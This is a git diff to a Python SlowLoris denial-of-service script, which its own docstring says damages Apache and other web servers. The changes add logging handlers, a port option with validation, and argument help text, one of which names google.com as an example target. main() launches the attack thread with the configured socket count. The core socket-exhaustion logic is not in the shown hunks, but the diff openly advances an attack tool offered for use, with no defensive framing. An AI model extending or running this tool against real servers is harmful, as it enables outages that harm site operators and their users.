@@ -5,6 +5,7 @@ import re
 import sys
 import time
 import socket
+import os.path
 import logging
 import argparse
 
@@ -16,7 +17,8 @@ from fake_useragent import UserAgent, FakeUserAgentError
 
 class SlowLoris(Thread):
     """
-        SlowLoris this class implement a HTTP vulnerability and damage different https based web-servers like a Apache 1.x, Apache 2.x and etc.
+        SlowLoris this class implement a HTTP vulnerability and damage different https based web-servers like a
+        Apache 1.x, Apache 2.x and etc.
         This class extends Thread that's mean you must launch in like a thread.(Thank you, captain Obvious!)
     """
 
@@ -136,18 +138,44 @@ def validate_url(url):
     return regex.match(url)
 
 
-def init():
-    # TODO write logging init
-    pass
+def initialize_logger(mode=0, output_dir="./logs/", format="%(asctime)s - %(levelname)s - %(message)s"):
+    #TODO нахера эти уровни, захерачить все в один.
+    logger = logging.getLogger()
+    logger.setLevel(logging.DEBUG)
+
+    # create console handler and set level to info
+    handler = logging.StreamHandler()
+    handler.setLevel(logging.INFO)
+    formatter = logging.Formatter(format)
+    handler.setFormatter(formatter)
+    logger.addHandler(handler)
+
+    # create error file handler and set level to error
+    handler = logging.FileHandler(os.path.join(output_dir, "sl_error.log"), "w", encoding=None, delay="true")
+    handler.setLevel(logging.ERROR)
+    formatter = logging.Formatter(format)
+    handler.setFormatter(formatter)
+    logger.addHandler(handler)
+
+    # create debug file handler and set level to debug
+    handler = logging.FileHandler(os.path.join(output_dir, "sl_all.log"), "w")
+    handler.setLevel(logging.DEBUG)
+    formatter = logging.Formatter(format)
+    handler.setFormatter(formatter)
+    logger.addHandler(handler)
 
 
 def parse_args():
     # TODO write description
     parser = argparse.ArgumentParser(add_help=True, description="")
-    parser.add_argument("-u", "--url", action="store", type=str, help="")
-    parser.add_argument("-s", "--socket-count", default=300, action="store", type=int, help="")
+    parser.add_argument("-u", "--url", action="store", type=str,
+                        help="Link to the web server (http://google.com) - str")
+    parser.add_argument("-s", "--socket-count", default=300, action="store", type=int,
+                        help="Maximum count of created connection (default value 300) - int")
+    parser.add_argument("-p", "--port", default=80, action="store", type=int, help="Port what will be used - int")
     # parser.add_argument("-l", "--list", action="store", type=str, help="") # TODO write list of sites
-    parser.add_argument("-m", "--mode-log", default=0, action="store", type=int, help="")
+    parser.add_argument("-m", "--mode-log", default=2, action="store", type=int,
+                        help="Logging mode (0-stdout, 1-file & stdout, 2-null) - int")
 
     if len(sys.argv) == 1:
         parser.print_help()
@@ -174,8 +202,13 @@ def parse_args():
         sys.exit(-1)
 
     if 0 <= args.mode_log <= 2:
-        # TODO logger init
-        pass
+        initialize_logger(mode=args.mode_log)
+    else:
+        parser.print_help()
+        sys.exit(-1)
+
+    if 0 <= args.port <= 65535:
+        res["port"] = args.port
     else:
         parser.print_help()
         sys.exit(-1)
@@ -187,7 +220,7 @@ def main(**kwargs):
     # TODO Write a beauty menu
     # TODO Write loggging
 
-    sl = SlowLoris(url=kwargs["url"], soc_cnt=kwargs["ss"])
+    sl = SlowLoris(url=kwargs["url"], soc_cnt=kwargs["ss"], port=kwargs["port"])
     sl.start()
     while True:
         try:
@@ -201,5 +234,4 @@ def main(**kwargs):
 
 if __name__ == "__main__":
     args = parse_args()
-    init()
     main(**args)
